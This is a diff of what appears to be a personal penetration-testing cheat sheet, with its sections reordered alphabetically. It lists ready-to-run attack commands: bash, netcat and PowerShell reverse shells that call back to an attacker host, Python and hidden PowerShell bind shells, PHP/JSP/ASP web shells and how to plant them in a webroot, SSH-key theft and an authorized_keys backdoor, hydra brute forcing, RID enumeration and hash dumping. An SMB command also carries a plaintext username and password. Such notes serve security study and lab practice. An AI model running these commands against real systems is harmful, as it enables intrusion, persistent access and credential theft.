@@ -1,221 +1,9 @@
-**ENUMERATION/BANNER GRABBING**
-. ssh username@IP port
-. banner grabbing ssh - nc ip port
-. banner grabbing ftp - nc -nv IP port
-. nmap -sV --script=banner -p IP
-. nmap --script smb-os-discovery.nse -p IP
-. enumerate shareable folders in smb = smbclient -N -L \\\\IP
-. connect to smb as guest = smbclient \\\\IP\\sharename
-. connect to smb as a user = smbclient -U username \\\\IP\\sharename
-. download file from smb = get file.txt
-
-
-
-
-
-**WEB**
-. gobuster dir -u http://url/ -w /usr/share/dirb/wordlists/common.txt
-. gobuster dns -d target.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
-. curl -IL https://target.com
-. whatweb target.com
-. url/robots.txt
-
-
-
-
-
-**PUBLIC EXPLOITATION**
-. searchsploit
-. msfconsole
-
-
-
-
-
-**REVERSE SHELL**
-. listen to port = nc [localhost](http://localhost) ip -lvnp 1234
-. find [localhost](http://localhost) ip = eth0
-. reverse shell code = bash -c 'bash -i >& /dev/tcp/localhostip/1234 0>&1'
-. reverse shell code 2 = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i **2**>**&1**|nc localhostip 1234 >/tmp/f
-. powershell reverse shell code = powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('localhostip',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
-
-
-
-
 
 **BIND SHELL = connect to target’s port**
 . bind shell code = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
 . python bind shell code = python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")’
 . powershell bind shell code = powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
 . connect to target’s exploited port containing shell = nc targetip 1234
-
-
-
-
-
-**UPGRADE TTY FOR FURTHER EXPLOIT**
-. python -c 'import pty; pty.spawn("/bin/bash")’
-. ctrl+z
-. stty raw -echo
-. fg
-. [ENTER]
-. [ENTER]
-. export TERM=xterm-256color
-. stty rows 67 columns 318
-
-
-
-
-
-**WEB SHELL**
-. php code = <?php system($_REQUEST["cmd"]); ?>
-. jsp code = <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
-. asp code = <% eval request("cmd") %>
-. find webroots : 
-Apache = /var/ww/html/
-Nginx = /usr/local/nginx/html/
-IIS = c:\inetpub\wwwroot\
-XAMPP = C:\xampp\htdocs\
-. EX: 
-a) Linux system running webroot Apache = echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
-b) Access the web shell : 
-opt 1 http://targetip:port/shell.php?cmd=id
-opt 2 curl http://targetip:port/shell.php?cmd=id
-port can be 80 or 443 or custom port
-
-
-
-
-
-**PRIVELEGE ESCALATION**
-. linpeas.sh
-. winpeas.bat
-
-
-
-
-
-**SUDO**
-. check possible commands without sudo = sudo -l
-. run commands without sudo = sudo -u username /bin/bash
-
-
-
-
-
-**SSH KEYS**
-. connect to ssh = ssh username@IP
-. read access to .ssh = /home/user/.ssh/id_rsa or /root/.ssh/id_rsa
-. EX:
-a) copy the ssh keys in id_rsa to our machine = nano id_rsa
-b) chmod 600 id_rsa
-c) ssh root@ip -i id_rsa
-d) write access to .ssh = create new ssh key = ssh-keygen -f key
-e) copy [key.pub](http://key.pub) on the target /root/.ssh/authorized_keys = echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
-f) ssh root@targetip -i key
-. bruteforce ssh = hydra -L username.txt -P password.txt ssh://IP
-. enumerate SSH = cd C:/Users/Dell/ssh-audit
-python3 ssh-audit.py IP
-. connect SSH = ssh -v username@IP -o PreferredAuthentications=password
-
-
-
-
-
-**TRANSFER FILES**
-. wget/curl : 
-. setup listener = python3 -m http.server 8000
-. transfer file = wget http://targetip:8000/filename
-. curl http://targetip:8000/filename -o filename
-. scp(needsshpassword) :
-. scp filename username@targetip:filedirectory
-. Base64 : 
-. base64 filename -w 0
-. echo filecontent | base64 -d > filename
-. check legitimacy of file transfer = md5sum filename
-
-
-
-
-
-**NMAP**
-. sudo nmap -sC -sV -sA IP -Pn --packet-trace --disable-arp-ping -Pn --reason --script vuln -D RND:5 -sT -sU
-. nmap from different source IP = nmap IP -n -Pn -p 000 -O -S 10.129.2.200 -e tun0
-. demilitarized zone = nmap --dns-server
-. filtered port scanning(bypass firewall) = nmap IP -p0000-sS -Pn -n --disable-arp-ping --packet-trace --source-port 00
-. connect to filtered port = ncat -nv --source-port IP 0000
-. dns version = nmap -sSU -p 53 --script dns-nsid IP
-
-
-
-
-
-**ENUMERATION PRINCIPLES**
-1. There is more than meets the eye. Consider all points of view.
-2. Distinguish between what we see and what we do not see.
-3. There are always ways to gain more information. Understand the target.
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/e7797c46-f1ea-43d4-8c89-3459298edc5b/c1de5a11-63b0-4c63-8812-293d39f853fe/image.png)
-
-
-
-
-
-**FTP**
-. vstpfd config file = cat /etc/vsftpd.conf | grep -v "#”
-. ftpusers check = cat /etc/ftpusers
-. anonymous login = ftp IP, ls, status, debug, trace
-. download ftp = ls, get file.txt
-. upload file = touch file.txt, put file.txt
-. interact with ftp = nc -nv IP 21, telnet IP 21
-. connect ftp using openssl = openssl s_client -connect 10.129.14.136:21 -starttls ftp
-. bruteforce ftp =  hydra -L username.txt -P password.txt ftp://IP
-
-
-
-
-
-**SMB**
-. smb config file = cat /etc/samba/smb.conf | grep -v "#\|\;" 
-. connect samba share = smbclient -N -L //IP
-. connect samba share with username = smbclient -L //IP -U username
-. connecting specific share of samba = smbclient [//10.129.203.6/GGJ](https://10.129.203.6/GGJ) -U 'jason%34c8zuNBo91!@28Bszh'
-help
-. download files from samba share = get files.txt
-. read files from samba share = !cat files.txt
-. check config user samba = smbstatus
-. enumerate smb = smbmap -H IP
-. alternative enumerate smb = crackmapexec smb IP - -shares -u ‘’ -p ‘’
-. bruteforce SMB:
-a) msfconsole
-b) search smb_login
-c) options
-
-
-
-
-
-**RPC**
-. connect to rpc = rpcclient -U “” IP
-. enumerate rpc = srvinfo, enumdomains, querydominfo, netshareenumall, netsharegetinfo sharefiles
-. enumerate users in rpc = enumdomusers, queryuser 0x000(RID), querygroup 0x000(RID)
-. brute force user RID = for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
-. alternative brute force user RID = cd C:\Users\Dell\samrdump, python3 [samrdump.py](http://samrdump.py) IP
-
-
-
-
-
-**NFS mountd**
-. NFS default configuration exports file = cat /etc/exports
-. NFS default configuration exportsFS file = echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
-. enumerate NFS = nmap --script nfs* IP -sV -p000
-. show NFS Shares = showmount -e IP
-. mount NFS Shares:
-a) mkdir target-NFS
-b) sudo mount -t nfs IP:/ ./target-NFS/ -o nolock
-c) cd target-NFS
-. list contents of NFS = ls -l mnt/nfs/
-. unmount NFS = sudo umount ./target-NFS
 
 
 
@@ -255,22 +43,30 @@ g) theHarvester
 
 
 
+**ENUMERATION/BANNER GRABBING**
+. ssh username@IP port
+. banner grabbing ssh - nc ip port
+. banner grabbing ftp - nc -nv IP port
+. nmap -sV --script=banner -p IP
+. nmap --script smb-os-discovery.nse -p IP
+. enumerate shareable folders in smb = smbclient -N -L \\\\IP
+. connect to smb as guest = smbclient \\\\IP\\sharename
+. connect to smb as a user = smbclient -U username \\\\IP\\sharename
+. download file from smb = get file.txt
 
-**SMTP**
-. default configuration SMTP = cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d”
-. connect SMTP: 
-a) telnet IP port
-b) HELO, EHLO
-. enumerate users on system: 
-a) telnet IP port
-b) VRFY username
-. nmap IP -p0000 - -script smtp-open-relay -v
-. enum users on system(more practical)
-a) msfconsole
-b) search smtp_enum
-c) set RHOSTS
-d) set USER_FILE
-e) RUN
+
+
+
+
+**FTP**
+. vstpfd config file = cat /etc/vsftpd.conf | grep -v "#”
+. ftpusers check = cat /etc/ftpusers
+. anonymous login = ftp IP, ls, status, debug, trace
+. download ftp = ls, get file.txt
+. upload file = touch file.txt, put file.txt
+. interact with ftp = nc -nv IP 21, telnet IP 21
+. connect ftp using openssl = openssl s_client -connect 10.129.14.136:21 -starttls ftp
+. bruteforce ftp =  hydra -L username.txt -P password.txt ftp://IP
 
 
 
@@ -289,10 +85,29 @@ b) A1 LOGIN username password
 
 
 
-**SNMP**
-. enumerate SNMP with community string = snmpwalk -v2c -c public IP
-. enumerate SNMP without community string = onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt IP
-. brute force SNMP with community string = braa public@IP:.1.3.6.*
+**IPMI**
+. enumerate IPMI = sudo nmap -sU - -script ipmi-version -p 000 IP
+. default credentials IPMI =
+![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/e7797c46-f1ea-43d4-8c89-3459298edc5b/ff24224e-5521-49ee-ae34-a32cd4de2f89/image.png)
+. dump IPMI hashes:
+a) msfconsole
+b) search ipmi_dumphashes
+c) options
+. crack hashes = hashcat -m value -a value hashfile wordlist
+
+
+
+
+
+**MSSQL**
+. enumerate MSSQL = sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=0000,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 0000 IP
+. further enumerate MSSQL
+a) msfconsole
+b) search mssql_ping
+c) options
+. connect MSSQL with credentials = sql server management
+. alternative connect MSSQL with credentials = python3 /usr/local/bin/mssqlclient.py username@<ip> -windows-auth
+. list databases MSSQL = select name from sys.databases
 
 
 
@@ -314,15 +129,29 @@ g) select * from tables where column = “<string>”;
 
 
 
-**MSSQL**
-. enumerate MSSQL = sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=0000,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 0000 IP
-. further enumerate MSSQL
-a) msfconsole
-b) search mssql_ping
-c) options
-. connect MSSQL with credentials = sql server management
-. alternative connect MSSQL with credentials = python3 /usr/local/bin/mssqlclient.py username@<ip> -windows-auth
-. list databases MSSQL = select name from sys.databases
+**NFS mountd**
+. NFS default configuration exports file = cat /etc/exports
+. NFS default configuration exportsFS file = echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
+. enumerate NFS = nmap --script nfs* IP -sV -p000
+. show NFS Shares = showmount -e IP
+. mount NFS Shares:
+a) mkdir target-NFS
+b) sudo mount -t nfs IP:/ ./target-NFS/ -o nolock
+c) cd target-NFS
+. list contents of NFS = ls -l mnt/nfs/
+. unmount NFS = sudo umount ./target-NFS
+
+
+
+
+
+**NMAP**
+. sudo nmap -sC -sV -sA IP -Pn --packet-trace --disable-arp-ping -Pn --reason --script vuln -D RND:5 -sT -sU
+. nmap from different source IP = nmap IP -n -Pn -p 000 -O -S 10.129.2.200 -e tun0
+. demilitarized zone = nmap --dns-server
+. filtered port scanning(bypass firewall) = nmap IP -p0000-sS -Pn -n --disable-arp-ping --packet-trace --source-port 00
+. connect to filtered port = ncat -nv --source-port IP 0000
+. dns version = nmap -sSU -p 53 --script dns-nsid IP
 
 
 
@@ -350,15 +179,57 @@ b) python3 [odat.py](http://odat.py) utlfile -s IP -d SID -U username -P passwor
 
 
 
-**IPMI**
-. enumerate IPMI = sudo nmap -sU - -script ipmi-version -p 000 IP
-. default credentials IPMI =
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/e7797c46-f1ea-43d4-8c89-3459298edc5b/ff24224e-5521-49ee-ae34-a32cd4de2f89/image.png)
-. dump IPMI hashes:
-a) msfconsole
-b) search ipmi_dumphashes
-c) options
-. crack hashes = hashcat -m value -a value hashfile wordlist
+**PRIVELEGE ESCALATION**
+. linpeas.sh
+. winpeas.bat
+
+
+
+
+
+**PUBLIC EXPLOITATION**
+. searchsploit
+. msfconsole
+
+
+
+
+
+**RDP**
+. enumerate RDP  = nmap -sV -sC IP -p3389 --script rdp*
+. check security features RDP = cd C:\Users\Dell\rdp-sec-check
+./rdp-sec-check.pl IP
+. connect RDP session = xfreerdp /u:username /p:”password” /v:IP
+. bruteforce RDP = hydra -L username.txt -P password.txt rdp://IP
+
+
+
+
+
+**REVERSE SHELL**
+. listen to port = nc [localhost](http://localhost) ip -lvnp 1234
+. find [localhost](http://localhost) ip = eth0
+. reverse shell code = bash -c 'bash -i >& /dev/tcp/localhostip/1234 0>&1'
+. reverse shell code 2 = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i **2**>**&1**|nc localhostip 1234 >/tmp/f
+. powershell reverse shell code = powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('localhostip',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+
+
+
+
+
+**RPC**
+. connect to rpc = rpcclient -U “” IP
+. enumerate rpc = srvinfo, enumdomains, querydominfo, netshareenumall, netsharegetinfo sharefiles
+. enumerate users in rpc = enumdomusers, queryuser 0x000(RID), querygroup 0x000(RID)
+. brute force user RID = for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
+. alternative brute force user RID = cd C:\Users\Dell\samrdump, python3 [samrdump.py](http://samrdump.py) IP
+
+
+
+
+
+**RSERVICES**
+. enumerate RSERVICES = sudo nmap -sV -p 512,513,514 IP
 
 
 
@@ -374,19 +245,138 @@ c) options
 
 
 
-**RSERVICES**
-. enumerate RSERVICES = sudo nmap -sV -p 512,513,514 IP
+**SNMP**
+. enumerate SNMP with community string = snmpwalk -v2c -c public IP
+. enumerate SNMP without community string = onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt IP
+. brute force SNMP with community string = braa public@IP:.1.3.6.*
 
 
 
 
 
-**RDP**
-. enumerate RDP  = nmap -sV -sC IP -p3389 --script rdp*
-. check security features RDP = cd C:\Users\Dell\rdp-sec-check
-./rdp-sec-check.pl IP
-. connect RDP session = xfreerdp /u:username /p:”password” /v:IP
-. bruteforce RDP = hydra -L username.txt -P password.txt rdp://IP
+**SMB**
+. smb config file = cat /etc/samba/smb.conf | grep -v "#\|\;" 
+. connect samba share = smbclient -N -L //IP
+. connect samba share with username = smbclient -L //IP -U username
+. connecting specific share of samba = smbclient [//10.129.203.6/GGJ](https://10.129.203.6/GGJ) -U 'jason%34c8zuNBo91!@28Bszh'
+help
+. download files from samba share = get files.txt
+. read files from samba share = !cat files.txt
+. check config user samba = smbstatus
+. enumerate smb = smbmap -H IP
+. alternative enumerate smb = crackmapexec smb IP - -shares -u ‘’ -p ‘’
+. bruteforce SMB:
+a) msfconsole
+b) search smb_login
+c) options
+
+
+
+
+
+**SMTP**
+. default configuration SMTP = cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d”
+. connect SMTP: 
+a) telnet IP port
+b) HELO, EHLO
+. enumerate users on system: 
+a) telnet IP port
+b) VRFY username
+. nmap IP -p0000 - -script smtp-open-relay -v
+. enum users on system(more practical)
+a) msfconsole
+b) search smtp_enum
+c) set RHOSTS
+d) set USER_FILE
+e) RUN
+
+
+
+
+
+**SSH KEYS**
+. connect to ssh = ssh username@IP
+. read access to .ssh = /home/user/.ssh/id_rsa or /root/.ssh/id_rsa
+. EX:
+a) copy the ssh keys in id_rsa to our machine = nano id_rsa
+b) chmod 600 id_rsa
+c) ssh root@ip -i id_rsa
+d) write access to .ssh = create new ssh key = ssh-keygen -f key
+e) copy [key.pub](http://key.pub) on the target /root/.ssh/authorized_keys = echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
+f) ssh root@targetip -i key
+. bruteforce ssh = hydra -L username.txt -P password.txt ssh://IP
+. enumerate SSH = cd C:/Users/Dell/ssh-audit
+python3 ssh-audit.py IP
+. connect SSH = ssh -v username@IP -o PreferredAuthentications=password
+
+
+
+
+
+**SUDO**
+. check possible commands without sudo = sudo -l
+. run commands without sudo = sudo -u username /bin/bash
+
+
+
+
+
+**TRANSFER FILES**
+. wget/curl : 
+. setup listener = python3 -m http.server 8000
+. transfer file = wget http://targetip:8000/filename
+. curl http://targetip:8000/filename -o filename
+. scp(needsshpassword) :
+. scp filename username@targetip:filedirectory
+. Base64 : 
+. base64 filename -w 0
+. echo filecontent | base64 -d > filename
+. check legitimacy of file transfer = md5sum filename
+
+
+
+
+
+**TTY UPGRADE FOR FURTHER EXPLOIT**
+. python -c 'import pty; pty.spawn("/bin/bash")’
+. ctrl+z
+. stty raw -echo
+. fg
+. [ENTER]
+. [ENTER]
+. export TERM=xterm-256color
+. stty rows 67 columns 318
+
+
+
+
+
+**WEB**
+. gobuster dir -u http://url/ -w /usr/share/dirb/wordlists/common.txt
+. gobuster dns -d target.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
+. curl -IL https://target.com
+. whatweb target.com
+. url/robots.txt
+
+
+
+
+
+**WEB SHELL**
+. php code = <?php system($_REQUEST["cmd"]); ?>
+. jsp code = <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+. asp code = <% eval request("cmd") %>
+. find webroots : 
+Apache = /var/ww/html/
+Nginx = /usr/local/nginx/html/
+IIS = c:\inetpub\wwwroot\
+XAMPP = C:\xampp\htdocs\
+. EX: 
+a) Linux system running webroot Apache = echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
+b) Access the web shell : 
+opt 1 http://targetip:port/shell.php?cmd=id
+opt 2 curl http://targetip:port/shell.php?cmd=id
+port can be 80 or 443 or custom port
 
 
 
